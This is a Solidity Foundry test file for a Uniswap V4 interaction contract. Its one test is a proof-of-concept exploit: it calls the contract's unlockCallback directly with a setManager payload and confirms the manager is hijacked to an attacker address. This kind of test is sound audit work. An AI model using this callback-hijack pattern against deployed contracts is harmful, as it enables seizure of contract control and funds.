
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {PoolManager} from "@uniswap/v4-core/src/PoolManager.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {UniswapV4InteractionContract} from "../contracts/UniswapV4InteractionContract.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {Deployers} from "@uniswap/v4-core/test/utils/Deployers.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolId, PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";

contract UniswapV4InteractionContractTest is Test, Deployers {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    UniswapV4InteractionContract public uniswapV4InteractionContract;
    MockERC20 public token0;
    MockERC20 public token1;

    function setUp() public {
        deployFreshManagerAndRouters();
        uniswapV4InteractionContract = new UniswapV4InteractionContract(address(manager));

        token0 = new MockERC20("Token0", "T0", 18);
        token1 = new MockERC20("Token1", "T1", 18);

        if (address(token0) > address(token1)) {
            (token0, token1) = (token1, token0);
        }

        key = PoolKey({
            currency0: Currency.wrap(address(token0)),
            currency1: Currency.wrap(address(token1)),
            fee: 3000,
            tickSpacing: 60,
            hooks: IHooks(address(0))
        });

        manager.initialize(key, TickMath.getSqrtPriceAtTick(0), "");

        token0.approve(address(manager), type(uint256).max);
        token1.approve(address(manager), type(uint256).max);
    }

    

    function testExploitSetManagerThroughCallback() public {
        address attackerManager = address(0xBAD);

        bytes memory payload = abi.encodeWithSelector(
            uniswapV4InteractionContract.setManager.selector,
            attackerManager
        );

        uniswapV4InteractionContract.unlockCallback(payload);

        assertEq(uniswapV4InteractionContract.manager(), attackerManager, "Manager was hijacked");
    }
}
